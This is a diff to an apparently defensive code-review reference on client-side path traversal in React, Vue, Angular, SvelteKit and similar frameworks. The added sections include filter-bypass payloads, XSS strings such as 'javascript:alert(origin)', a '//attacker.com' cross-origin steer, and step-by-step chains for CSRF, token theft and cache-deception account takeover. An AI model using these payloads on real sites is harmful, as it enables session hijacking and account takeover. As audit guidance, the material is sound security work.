@@ -7,8 +7,6 @@ description: Client Side Path Traversal (CSPT) and secondary-context path traver
 
 Client Side Path Traversal occurs when a frontend router decodes a URL path/query/hash component and a developer interpolates that decoded value directly into a `fetch`-style request URL. The browser (or server-side enhanced fetch) then resolves the embedded `../` before issuing the request, redirecting the call to an unintended same-origin endpoint. CSPT bypasses frontend route guards and lets attackers control the destination of an authenticated API call. When chained with open redirect, file upload, or HTML-rendering sinks (`dangerouslySetInnerHTML`, `v-html`, `[innerHTML]`, `{@html}`, `{{{ }}}`, Solid `innerHTML`), it commonly escalates to CSRF, stored XSS, or SSRF / secondary-context path traversal in hybrid frameworks (Next.js route handlers, SvelteKit `+page.server.ts`/`+server.ts`, Nuxt `server/api/`, SolidStart `"use server"` functions).
 
-> Reference: "The Dot-Dot-Slash That Frameworks Hand You: CSPT Across Every Major Frontend Framework" — Jonathan Dunn (xssdoctor), April 2026 — `https://lab.ctbb.show/research/the-dot-dot-slash-that-frameworks-hand-you`
-
 ## Where to Look
 
 **Frontend SPA Routers**
@@ -22,6 +20,11 @@ Client Side Path Traversal occurs when a frontend router decodes a URL path/quer
 - Query params: `useSearchParams`, `route.query`, `queryParamMap`, `url.searchParams`
 - Hash fragment: `window.location.hash`
 - Stored payloads (Nuxt island `__NUXT__` payload — CVE-2025-59414)
+
+**Source taxonomy** — like XSS, a CSPT source is any attacker-influenced value that reaches a path; it is NOT limited to the router. Audit all three classes:
+- **Reflected**: `?id=…`, path segment, or hash read on page load (`page?id=XXX`, `page#id=XXX`). The most common (and usually 1-click) form.
+- **DOM-based**: any value read from the DOM/browser state — `location.*`, `document.referrer`, `postMessage` event data, `localStorage`/`sessionStorage`, `name`, or values previously written into the page — then interpolated into a request path.
+- **Stored**: a value persisted server-side (DB record, profile field, filename) that the frontend later reads and concatenates into a fetch path. Stored CSPT fires for any user who loads the poisoned view and is easily missed by passive scanners (use a canary token to surface it).
 
 **Client Sinks**
 - `fetch()`, `XMLHttpRequest`, `axios.*`, `useFetch`/`$fetch` (Nuxt), `useSWR`/`useQuery` URL templates, Angular `HttpClient.get/post/put`, Ember Data adapters (`urlForFindRecord`, `urlForQuery`), Solid `createResource`/`createAsync`, RTK Query, Apollo `link.uri` builders
@@ -465,6 +468,35 @@ When a CSPT-controlled `fetch` response is rendered as raw HTML, CSPT escalates 
 | Ember | `{{{val}}}`, `htmlSafe(val)` | `insertAdjacentHTML('beforeend', val)` |
 | SolidStart | `<div innerHTML={val} />` | `element.innerHTML = val` |
 
+### URL-attribute scheme injection — XSS WITHOUT an innerHTML sink
+
+A CSPT-controlled response field bound into an **`href`/`src`/`xlink:href`/`formaction`** attribute is an XSS sink when its value is a `javascript:` (or `data:`/`vbscript:`) URL — framework HTML **auto-escaping does NOT neutralize this**, because the value is a valid attribute string, not injected markup. So `<a href={resp.externalUrl}>` with `externalUrl = "javascript:alert(origin)"` executes on click even though there is no `dangerouslySetInnerHTML`/`v-html`/`{@html}`. This is the common "controlled JSON → `href`" escalation seen in real CSPT chains (e.g. a profile/skill object whose `externalUrl`/`website`/`avatar` field feeds an anchor or image).
+
+| Framework | URL-attribute binding | `javascript:` href executes? |
+|-----------|-----------------------|:----------------------------:|
+| React / Next.js | `<a href={val}>`, `<img src={val}>` | YES (React only logs a dev warning; it renders the URL) |
+| Vue / Nuxt | `:href="val"`, `:src="val"` | YES (Vue does not sanitize URL attributes) |
+| SvelteKit | `<a href={val}>` | YES |
+| Ember | `<a href={{val}}>` | YES |
+| SolidStart | `<a href={val}>` | YES |
+| Angular | `[href]="val"`, `[src]="val"` | NO for `[href]` (Angular strips `javascript:` → `unsafe:`); YES if `bypassSecurityTrustUrl()`/`bypassSecurityTrustResourceUrl()` is used |
+
+Often **requires user interaction** (a click) and so is typically **High** rather than Critical on its own, but it is a genuine XSS — do not dismiss a CSPT-controlled response just because the render path is "only" attribute interpolation. Treat any `href`/`src` bound from a CSPT-reachable response as a sink unless the framework sanitizes the scheme (Angular `[href]`) or the code validates the scheme against an `https?:`/relative allowlist.
+
+## CSPT → Code Execution via Dynamic Module / Script Load
+
+Unlike a `fetch` sink (which only *retrieves* a response), a dynamic module/script sink **resolves `../` and then executes** the loaded code in a same-origin context. A decoded param interpolated into `import()`, `importScripts()`, `new Worker()`/`new SharedWorker()`, or `navigator.serviceWorker.register()` lets an attacker traverse out of the intended directory to **any same-origin `.js` URL** — and that code runs with the page's full DOM/session/origin authority. This is a **direct CSPT → XSS/RCE-in-page** primitive that does NOT require an HTML render sink.
+
+```javascript
+// VULN — decoded route param chooses a module path
+const { widgetName } = useParams();              // "../../uploads/evil"
+import(`./widgets/${widgetName}.js`);            // loads & EXECUTES /uploads/evil.js
+```
+
+It becomes exploitable whenever the attacker can make *some* same-origin URL return JavaScript: a file-upload/attachment endpoint that serves user content same-origin, a JSONP/callback endpoint, a stored-content route, or even a CSPT-reachable API that reflects attacker text with a JS-compatible content type. `import()` requires a JS MIME type; `importScripts`/`Worker` are more permissive. Treat any module/script-load sink fed a decoded value as **Critical** when a same-origin attacker-controllable script is reachable, **High** otherwise (it still breaks the module-path allowlist / can load unintended internal modules).
+
+**SAFE**: resolve from a fixed allowlist map (`const mods = { chart: () => import('./widgets/chart.js') }; mods[name]?.()`), or validate against `^[\w-]+$` before interpolation. Never interpolate a decoded value into a module/script URL.
+
 ## Safe Sources — What Won't Betray You
 
 | Framework | Safe Source | Why |
@@ -528,6 +560,13 @@ caches.match(`/api/x/${userId}`);                // service-worker cache key —
 self.fetch(`/api/x/${userId}`);                  // inside a ServiceWorker
 self.registration.showNotification('', { data: { url: `/api/x/${userId}` }});
 
+// Dynamic module / script loaders — resolve `../` AND then EXECUTE the result (CSPT -> code execution)
+import(`./widgets/${userId}.js`);                // dynamic ESM import — runs the loaded module in page context
+importScripts(`/sw-plugins/${userId}.js`);       // inside a Worker/ServiceWorker — runs the script
+new Worker(`/workers/${userId}.js`, { type: 'module' });
+new SharedWorker(`/workers/${userId}.js`);
+navigator.serviceWorker.register(`/sw/${userId}.js`);   // traversed scope/script can hijack the origin
+
 // Library wrappers — same underlying primitive
 useSWR(`/api/x/${userId}`, fetcher);
 useQuery({ queryKey: ['x', userId], queryFn: () => fetch(`/api/x/${userId}`) });
@@ -571,9 +610,49 @@ window.open(next);
 
 Combine with CSPT: a redirected fetch returning a URL string that flows into `location.assign` chains CSPT → open redirect → credential theft via spoofed login page on the attacker domain.
 
-## CSPT → CSRF Chain (Doyensec / `cspt2csrf`)
+## Payload & Filter-Bypass Techniques
 
-Doyensec published a practical exploitation method that uses a CSPT primitive to *redirect a state-changing API call* to a different endpoint on the same origin. Because the browser still attaches the user's session cookies to the redirected request, CSPT becomes a fully-functional CSRF primitive even when the target API uses `SameSite=Lax`/`Strict` cookies — the request originates from the legitimate first-party page.
+The path the attacker controls is rarely the *whole* URL — usually it sits between a fixed prefix and a fixed suffix, often with a sanitizer applied. These techniques widen a constrained injection into a usable traversal. Recognizing them in code review prevents false negatives where a partial constraint is mistaken for a full defense.
+
+| Technique | Use when | Payload mechanic |
+|-----------|----------|------------------|
+| **Suffix truncation** | input sits mid-path with a fixed trailing segment, e.g. `fetch(\`/articles/${id}/metadata\`)` | end the value with `?` (`%3F`) or `#` (`%23`) — everything after becomes query/hash, so `id=../uploads/x.json%3F` → `/articles/../uploads/x.json?/metadata` → reaches `/uploads/x.json`. (`#` is not even sent to the server.) |
+| **Single `..` past `encodeURIComponent`** | every segment is `encodeURIComponent`'d (so `/` is blocked) but you control ≥1 segment | `encodeURIComponent` leaves `.` untouched: set a segment to exactly `..` to climb one level per controlled segment; chain across multiple segments to reach a sibling path sharing the fixed suffix (`group=..&user=uploads&id=x.json` → `/users/../uploads/posts/x.json` → `/uploads/posts/x.json`) |
+| **Empty / `.` / `/`** | hitting a more general handler is enough (list-all vs. one record) | `id=`, `id=.`, `id=/` → `/users/`, `/users/.`, `/users//` — collapses to a less-specific route |
+| **Backslash = slash** | a custom filter blocks `/` but not `\` | the browser treats `\` as `/` in URLs and rewrites it before sending: `..\..\admin` → `/../../admin` |
+| **Tab/newline stripping** | a filter looks for the literal string `..` or a keyword | the URL parser strips `\t`/`\n`/`\r` first: `.%0A.` (`.\n.`) is parsed as `..`; `bloc%0Aked` defeats a `blocked` keyword filter |
+| **Case / double encoding** | a server or reverse proxy decodes before resolving | test both `%2f`/`%2F`; if the app explicitly `decodeURIComponent`s its input, `%252e%252e%252f` round-trips to `../`; mixed obfuscation `%2e%0a%09%2e\other` → `../other` |
+| **Leading `//` → cross-origin** | the controlled value is the FIRST path segment, e.g. `fetch(\`/${lang}/info\`)` | a value starting with `//host` is parsed as a protocol-relative absolute URL: `lang=/attacker.com` → `//attacker.com/info` — the fetch (and any `headers`/`body` it carries) goes cross-origin (see Authorization-header leak below) |
+
+### Authorization-header leak via cross-origin redirect
+
+When the vulnerable `fetch` sets sensitive `headers` (e.g. `Authorization: Bearer …`) or a body, a leading-`//` or open-redirect gadget that sends the request **cross-origin** can exfiltrate them. The browser's rule: a request that is **same-origin at first** has its `Authorization` header dropped on a cross-origin redirect, but a request that is **cross-origin from the start keeps it across further redirects** — and `www.`/`api.` subdomain differences count as cross-origin. So traversing a `fetch` on `example.com` to `https://api.example.com/redirect?url=https://attacker.tld` forwards the bearer token to the attacker. Flag any CSPT-controllable `fetch` that attaches `Authorization`/cookies/CSRF headers and can be steered cross-origin as a **credential-exfiltration** primitive, not just a redirected read.
+
+## Gaining Control of the Response (gadgets)
+
+A CSPT that only *reads* an endpoint becomes XSS/CSRF when the attacker can make the redirected request return **attacker-controlled content**. Audit the app for these response gadgets and treat any that is reachable from a CSPT as an escalation, not a separate low-severity bug:
+
+- **File upload / download** — upload JSON (or any allowed type) whose fields match what the frontend reads, then traverse the fetch to its same-origin download URL. The most common gadget; protections like `Content-Disposition: attachment`, blocked `.html`, or CSP do **not** stop a `fetch` from reading the body.
+- **Polyglots** — when upload validation enforces a format (PDF/image), craft a file that is simultaneously valid JSON (starts `{"`, ends `"}`) and a valid PDF/WebP, so it passes the filter yet parses as the JSON the frontend expects.
+- **Content-type confusion** — any JSON endpoint that reflects your input (e.g. a profile `name`) is an HTML gadget: JSON does not encode `<`, so traversing an `innerHTML`-bound fetch to `/users/1337?` where the name is `<img src onerror=alert(origin)>` renders it as HTML. No upload needed.
+- **Open redirect as a gadget** — an on-site `…/redirect?url=https://attacker.com` lets the CSPT reach the attacker's server (which can return any body/headers/CORS), turning a same-origin-only CSPT into full response control.
+- **Recursion** — when the response is JSON whose fields feed *another* fetch, chain CSPT through those IDs into a second CSPT (e.g. GET→POST escalation, more HTML sinks).
+
+## CSPT → Cache Deception → Account Takeover
+
+A CSPT can weaponize an otherwise-unexploitable **web cache deception** finding (and vice-versa). The link is the same property that makes CSPT defeat CSRF tokens: the redirected request carries the legitimate page's **auth header/cookies**, which the victim's browser would never attach to a directly-typed URL.
+
+Chain:
+1. A sensitive same-origin endpoint (e.g. `GET /v1/token` returning the user's token) requires an auth header, so it cannot be triggered by a plain navigation — and on its own it is cache-deception-vulnerable: requesting `/v1/token.css` returns the same JSON but the CDN now caches it (`Cache-Control: public`, static-looking extension).
+2. A CSPT exists in an **authenticated** client `fetch`: `fetch(\`https://api.example.com/v1/users/info/${userId}\`, { headers: { 'X-Auth-Token': … } })`.
+3. Victim visits `https://app/profile?userId=../../../v1/token.css`. The fetch resolves to `https://api.example.com/v1/token.css` **with the victim's auth header**, so the API returns the victim's token and the CDN caches it under that static-looking key.
+4. The attacker then fetches `https://api.example.com/v1/token.css` **unauthenticated** and reads the victim's cached token → account takeover.
+
+Detection rule: when a CSPT-controllable authenticated `fetch` shares an origin with any endpoint that returns sensitive data and is reachable with a cache-deception suffix (`.css`/`.js`/`.json`/path-confusion), flag a **Critical** CSPT→cache-deception→ATO chain. See `web_cache_deception.md`.
+
+## CSPT → CSRF Chain
+
+A practical exploitation method uses a CSPT primitive to *redirect a state-changing API call* to a different endpoint on the same origin. Because the browser still attaches the user's session cookies to the redirected request, CSPT becomes a fully-functional CSRF primitive even when the target API uses `SameSite=Lax`/`Strict` cookies — the request originates from the legitimate first-party page.
 
 Typical chain:
 
@@ -584,13 +663,23 @@ Typical chain:
 
 Detection rule: flag any state-changing (`POST`/`PUT`/`PATCH`/`DELETE`) `fetch` whose URL template interpolates a decoded source as a high-priority CSPT-to-CSRF finding, NOT just a CSPT-to-data-disclosure finding.
 
+**Source restrictions define exploitability.** A CSPT reroutes an *existing* request, so the attacker inherits its fixed HTTP method, headers, and body — the only thing under control is the path. Triage each source by what its request already carries:
+
+- **Method** is fixed per source. A `GET` source and a `POST` source on the same app are different primitives with different reachable sinks. Enumerate sinks that share the source's method/headers/body.
+- **Headers/body** ride along unchanged (this is *why* it defeats CSRF tokens: the legitimate page attaches them). Body params can't be set directly, but you can often **append `?key=value&` in the traversal** to inject query params that the backend merges over/with the body — sometimes supplying the missing parameters a state-changing endpoint needs.
+
+**GET-sink → POST-sink chaining via a controllable-JSON gadget** (the high-impact GET→POST chaining technique): when only a `GET` CSPT is available, point it at an endpoint that returns attacker-controlled JSON — most commonly a **file upload/download** feature (upload JSON, then traverse to its download URL). The frontend parses that JSON and uses a field (e.g. `id`) to build a *second* request; by controlling that field you drive a `POST`/`PATCH`/`DELETE` to an arbitrary endpoint. Two chained CSPTs turn a read-only primitive into a state-changing one. When auditing, treat any file-upload/download API reachable from a CSPT as a CSRF gadget, not just a data sink.
+
+Representative CVEs (CSPT2CSRF): **CVE-2023-45316** (Mattermost, POST sink), **CVE-2023-6458** (Mattermost, GET-sink chained to POST via the file gadget), and a 1-click POST-sink CSPT2CSRF in Rocket.Chat — all driven by a decoded path/query value reflected into a subsequent request path.
+
 ## Tooling for Triage
 
-These are dynamic-testing tools, useful when the user explicitly asks for runtime verification.
+These are dynamic-testing capabilities, useful when the user explicitly asks for runtime verification.
 
-- **Burp Suite DOM Invader** (ships with Burp's built-in browser) — its CSPT panel automatically mutates dynamic path segments with `%2F` / `%5C` / `%252F` / `%255C` / literal `../` and observes whether subsequent `fetch`/XHR/WebSocket URLs traverse to a different endpoint. The fastest way to confirm a real target.
-- **Caido `cspt2csrf` extension** — implements the Doyensec CSPT-to-CSRF chain; given a CSPT source, it enumerates reachable state-changing endpoints and generates a working CSRF PoC link.
-- **Caido** generally is the preferred CSPT triage proxy today; its Match-and-Replace + Response Highlighter make it straightforward to trace decoded-param → fetch flows.
+- **Browser-based CSPT scanners** automatically mutate dynamic path segments with `%2F` / `%5C` / `%252F` / `%255C` / literal `../` and observe whether subsequent `fetch`/XHR/WebSocket URLs traverse to a different endpoint. The fastest way to confirm a real target.
+- **Passive CSPT scanners** flag query params reflected into the *path* of another request and enumerate sinks sharing the same host/method; canary-token modes surface **stored and DOM-based** CSPT that a passive scan alone misses (paste the canary as input, watch for it appearing in a request path).
+- **CSPT-to-CSRF tooling** enumerates reachable state-changing endpoints from a CSPT source and generates a working CSRF PoC link.
+- **Intercepting-proxy workflow**: match-and-replace rules and response highlighting make it straightforward to trace decoded-param → fetch flows.
 - Manual confirmation: open DevTools → Network, set a breakpoint on `fetch`/`XMLHttpRequest.open`, navigate to the crafted URL, and check the *resolved* request URL after the browser collapses `../`.
 
 ## Detection Rules
@@ -606,7 +695,9 @@ fetch(`/api/.../${x}/...`);             // any axios/HttpClient/useFetch/$fetch
 ```
 
 ```javascript
-// SAFE — value re-encoded at the sink
+// MOSTLY SAFE — value re-encoded at the sink (blocks new `/`, so no arbitrary descent)
+// BUT encodeURIComponent does NOT encode `.`: x=".." still climbs one level
+// (/api/<x>/foo → /api/foo). Fully safe only with an allowlist/numeric coercion below.
 fetch(`/api/.../${encodeURIComponent(x)}/...`);
 ```
 
@@ -676,6 +767,7 @@ Flag CRITICAL when ANY of the following are present in the same component/page w
 - SvelteKit: `{@html <fetch-response>}`
 - Ember: `{{{<fetch-response>}}}` or `htmlSafe(<fetch-response>)`
 - SolidStart: `<div innerHTML={<fetch-response>} />`
+- Any framework (except Angular `[href]`): a `<fetch-response>` field bound into `href`/`src`/`formaction` that can be a `javascript:`/`data:` URL — e.g. `<a href={resp.externalUrl}>`, `:href="resp.website"`, `<img src={resp.avatar}>` (click-triggered XSS; no innerHTML needed)
 
 ## Confirming a Finding
 
@@ -689,15 +781,15 @@ Flag CRITICAL when ANY of the following are present in the same component/page w
 ## Common False Alarms
 
 - The decoded value is constrained by an allowlist regex (e.g., SvelteKit param matcher `[id=id]`, route guards that reject non-matching shapes) BEFORE reaching `fetch`.
-- The value is `encodeURIComponent`'d at every interpolation point (full encoding, not just `encodeURI`).
+- The value is `encodeURIComponent`'d at every interpolation point (full encoding, not just `encodeURI`) **AND** the template has no fixed trailing path the attacker can reach by climbing. Caveat: `encodeURIComponent` does NOT encode `.` — a segment set to exactly `..` survives encoding and still collapses one directory level (`/api/groups/${encodeURIComponent(x)}/...` with `x=".."` → `/api/groups/../...`). `encodeURIComponent` blocks injecting new `/` (no arbitrary descent / no multi-`../`), but it does NOT block single-`..` climbing; an attacker controlling several encoded segments can climb several levels and land on a sibling endpoint that shares the template's fixed suffix. Treat `encodeURIComponent`-only as a **partial mitigation**, not a clean false alarm — a strict allowlist/regex or numeric coercion is the real defense. (See "Payload & Filter-Bypass Techniques".)
 - The value flows ONLY into framework-safe sources: `useLocation().pathname`, `route.path`, `route.fullPath`, `router.url`, `window.location.pathname`, `getRouterParam()` (Nuxt server, no `{ decode: true }`), or SolidStart `useParams()` for single segments.
 - The fetch URL is constructed with `URL` / `URLSearchParams` and the value is set via `searchParams.set(...)`, which encodes; OR the value is the FULL URL passed to `fetch` (no traversal possible — no base path to escape).
-- The response is rendered with framework auto-escaping only (no `dangerouslySetInnerHTML`/`v-html`/`{@html}`/triple curlies/`bypassSecurityTrustHtml`/Solid `innerHTML`) — CSPT to XSS is NOT exploitable, but the underlying CSPT may still be a CSRF/IDOR primitive.
+- The response is rendered with framework auto-escaping only (no `dangerouslySetInnerHTML`/`v-html`/`{@html}`/triple curlies/`bypassSecurityTrustHtml`/Solid `innerHTML`) **AND** no CSPT-controlled field is bound into an `href`/`src`/`formaction` attribute — CSPT to XSS is NOT exploitable, but the underlying CSPT may still be a CSRF/IDOR primitive. Caveat: auto-escaping does NOT stop a `javascript:`/`data:` URL in an `href`/`src` binding (see "URL-attribute scheme injection") — that is still XSS in React/Vue/Svelte/Ember/Solid (Angular `[href]` is the exception). Only treat the auto-escape path as safe when every CSPT-reachable response field lands in a text/escaped position, not a URL attribute.
 - Static `fetch` URLs with no string interpolation of user-controlled values.
 
 ## Severity Heuristics
 
-- **Critical**: CSPT chained to XSS via `innerHTML`-class sink AND the redirected endpoint can return attacker-controlled HTML (file upload / attachments / user content); OR secondary-context PT in a server route handler / `+page.server.ts` / Nuxt `server/api` / SolidStart `"use server"` that reaches internal services.
+- **Critical**: CSPT chained to XSS via `innerHTML`-class sink AND the redirected endpoint can return attacker-controlled HTML (file upload / attachments / user content); OR CSPT into a dynamic module/script-load sink (`import()`, `importScripts()`, `Worker`, `serviceWorker.register`) that can reach an attacker-controllable same-origin script (code execution in page/worker context); OR secondary-context PT in a server route handler / `+page.server.ts` / Nuxt `server/api` / SolidStart `"use server"` that reaches internal services; OR a GET→POST CSPT2CSRF chain (via a controllable-JSON/file-upload gadget) that reaches a sensitive state-changing endpoint; OR a CSPT→cache-deception chain that caches a victim's authenticated sensitive response (token/PII) at an attacker-readable URL (account takeover); OR a leading-`//`/open-redirect gadget that steers a CSPT `fetch` cross-origin and leaks its `Authorization`/cookie/CSRF header.
 - **High**: CSPT primitive that lets an authenticated user redirect a privileged API call to a different same-origin endpoint (CSRF primitive, IDOR amplifier, ACL bypass), without an XSS chain.
 - **Medium**: CSPT to a non-sensitive endpoint, or an open-redirect-only chain (e.g., Angular `router.navigate([decoded])`).
 - **Informational**: Decoded source flows into a fetch URL but is gated by a strict allowlist or param matcher; document as defense-in-depth gap.
@@ -712,7 +804,7 @@ Flag CRITICAL when ANY of the following are present in the same component/page w
 
 ## Core Principle
 
-Treat every value returned by a frontend router's param/query API as URL-decoded user input until proven otherwise. Either re-encode it with `encodeURIComponent` at every fetch interpolation, constrain it with a strict allowlist (regex / param matcher) BEFORE it reaches the sink, or read raw URL state from the framework's safe source (`useLocation().pathname`, `route.path`, `router.url`, `window.location.pathname`, SolidStart `useParams`). Never interpolate a decoded path/query/hash value directly into a `fetch`/`HttpClient`/`useFetch`/`$fetch`/Ember Data URL template without one of those defenses. For hybrid frameworks, apply the same rule on the server side — `+page.server.ts`, route handlers, `server/api/*`, and `"use server"` functions all need the same allowlist or re-encoding before forwarding values into internal `fetch` calls.
+Treat every value returned by a frontend router's param/query API as URL-decoded user input until proven otherwise. The strongest defense is to constrain it with a strict allowlist (regex / param matcher) or numeric coercion BEFORE it reaches the sink; re-encoding with `encodeURIComponent` at every fetch interpolation helps but is only partial (it blocks `/` injection, not a single `..` climbing one level), so prefer an allowlist when the template has a fixed trailing path. Or read raw URL state from the framework's safe source (`useLocation().pathname`, `route.path`, `router.url`, `window.location.pathname`, SolidStart `useParams`). Never interpolate a decoded path/query/hash value directly into a `fetch`/`HttpClient`/`useFetch`/`$fetch`/Ember Data URL template without one of those defenses. For hybrid frameworks, apply the same rule on the server side — `+page.server.ts`, route handlers, `server/api/*`, and `"use server"` functions all need the same allowlist or re-encoding before forwarding values into internal `fetch` calls.
 
 ## Analyst Notes
 
@@ -730,9 +822,9 @@ The closest automated models map CSPT primitives to **client-side request forger
 
 **Sources**: non-server-side remote sources (browser `useParams`, `useSearchParams`, `location`-derived values).
 
-**Sinks**: `fetch`, `axios`, `XMLHttpRequest.open`, URL template concatenation before HTTP request.
+**Sinks**: `fetch`, `axios`, `XMLHttpRequest.open`, URL template concatenation before HTTP request; dynamic module/script loaders that resolve-then-execute (`import()`, `importScripts()`, `Worker`/`SharedWorker`, `serviceWorker.register`).
 
-**Sanitizers**: numeric coercion of IDs; allowlist regex before interpolation; `encodeURIComponent` at sink; `URLSearchParams.set` for query values; sanitizing prefix edges in URL builders.
+**Sanitizers**: numeric coercion of IDs; allowlist regex before interpolation; `URLSearchParams.set` for query values; sanitizing prefix edges in URL builders. `encodeURIComponent` at the sink is only a **partial** sanitizer — it stops `/` injection (no arbitrary descent) but not single-`..` climbing, so it is not sufficient on its own.
 
 **SAFE pattern**: restrict param to digits — parse `message_id` as number before fetch; matches manual `encodeURIComponent` / allowlist guidance in this reference.
 
@@ -740,6 +832,7 @@ The closest automated models map CSPT primitives to **client-side request forger
 - Client-side URL redirect — open redirect via decoded param in `location` / router
 - Server-side request forgery — secondary-context PT in route handlers / server fetch (not browser-normalized)
 - Path injection — server-side path sinks (Next route handler internal paths)
+- Web cache deception — CSPT can cache an authenticated response at an attacker-readable URL (see `web_cache_deception.md`)
 - HTTP-to-file access — separate CWE-912 backdoor pattern, not CSPT
 
 Framework-specific decoding tables (React Router vs SolidStart) require heuristic/manual review. Vue/Nuxt/Angular/SvelteKit CSPT requires taint from client source to fetch sink when URL is built in the browser bundle.
